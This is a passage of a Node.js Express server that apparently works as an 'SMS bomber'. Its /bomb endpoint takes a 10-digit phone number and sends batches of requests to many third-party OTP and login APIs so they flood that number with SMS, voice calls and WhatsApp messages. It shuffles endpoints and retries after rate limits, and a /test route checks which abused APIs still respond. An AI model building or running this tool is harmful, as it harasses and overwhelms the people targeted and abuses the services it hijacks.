                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { status: st, success: true, category: 'success', responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RL (${responseTime}ms)`, 'rl');
            if (api.rateLimit && retryCount < 1) {
                await new Promise(r => setTimeout(r, 3000));
                return makeApiCall(api, phone, retryCount + 1);
            }
            return { status: st, success: false, category: 'ratelimit', responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { status: st, success: false, category: 'rejected', responseTime };
        } else {
            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} 5XX (${responseTime}ms)`, 'error');
            return { status: st, success: false, category: 'fail5xx', responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    let maxRequests = 100;
    if (effectiveDuration <= 1) maxRequests = 200;
    else if (effectiveDuration <= 5) maxRequests = 150;
    else if (effectiveDuration <= 10) maxRequests = 100;
    else maxRequests = 80;

    const shuffledNormal = [...NORMAL_APIS];
    for (let i = shuffledNormal.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledNormal[i], shuffledNormal[j]] = [shuffledNormal[j], shuffledNormal[i]];
    }

    const shuffledRateLimit = [...RATE_LIMIT_APIS];
    for (let i = shuffledRateLimit.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledRateLimit[i], shuffledRateLimit[j]] = [shuffledRateLimit[j], shuffledRateLimit[i]];
    }

    const combined = [];
    let rateLimitIdx = 0;
    for (let i = 0; i < shuffledNormal.length; i++) {
        combined.push(shuffledNormal[i]);
        if ((i + 1) % 5 === 0 && rateLimitIdx < shuffledRateLimit.length) {
            combined.push(shuffledRateLimit[rateLimitIdx]);
            rateLimitIdx++;
        }
    }
    while (rateLimitIdx < shuffledRateLimit.length) {
        combined.push(shuffledRateLimit[rateLimitIdx]);
        rateLimitIdx++;
    }

    console.log(`📋 Combined: ${combined.length} APIs (Normal: ${shuffledNormal.length}, RL: ${shuffledRateLimit.length})`);

    let sent = 0;
    const BATCH_SIZE = 5;

    for (let i = 0; i < combined.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = combined.slice(i, Math.min(i + BATCH_SIZE, combined.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < combined.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: uniqueApis.length,
        normal_apis: NORMAL_APIS.length,
        rate_limited_apis: RATE_LIMIT_APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: uniqueApis.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of uniqueApis) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    const rl = results.filter(r => r.category === 'ratelimit').length;
    const rej = results.filter(r => r.category === 'rejected').length;
    logEvent(`🧪 Test done: ${working} OK, ${rl} RL, ${rej} Rejected`, 'info');
    res.json({ phone, total: results.length, working, rate_limited: rl, rejected: rej, failed: results.length - working - rl - rej, results });
});

app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            isRateLimited: s.isRateLimited,
            total: s.total,
            working_2xx: s.working_2xx,
            rate_limited_429: s.rate_limited_429,
            rejected_4xx: s.rejected_4xx,
            failed_5xx: s.failed_5xx,
            network_error: s.network_error,
            successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length,
            marked_rate_limited: arr.filter(a => a.isRateLimited).length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-100).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = { 
            name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0, 
            rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null, 
            lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0,
            isRateLimited: stats[key].isRateLimited
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);

    try {
        const result = await runBombing(phone, effectiveDuration);
        console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: uniqueApis.length
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: uniqueApis.length,
        normal: NORMAL_APIS.length,
        rate_limited: RATE_LIMIT_APIS.length,
        normal_api_names: NORMAL_APIS.map(a => a.name),
        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server on port ${PORT}`);
    console.log(`📊 Total: ${uniqueApis.length} | Normal: ${NORMAL_APIS.length} | RL: ${RATE_LIMIT_APIS.length}`);
    console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
    console.log('═══════════════════════════════════════════');
    console.log('Endpoints:');
    console.log('  GET  /              Status');
    console.log('  GET  /health        Health');
    console.log('  GET  /test?phone=X  Test all');
    console.log('  GET  /stats         Working/RL/Rejected/Failed');
    console.log('  GET  /logs          Recent logs');
    console.log('  GET  /apis          List');
    console.log('  POST /bomb          Bombing');
    console.log('═══════════════════════════════════════════');
});
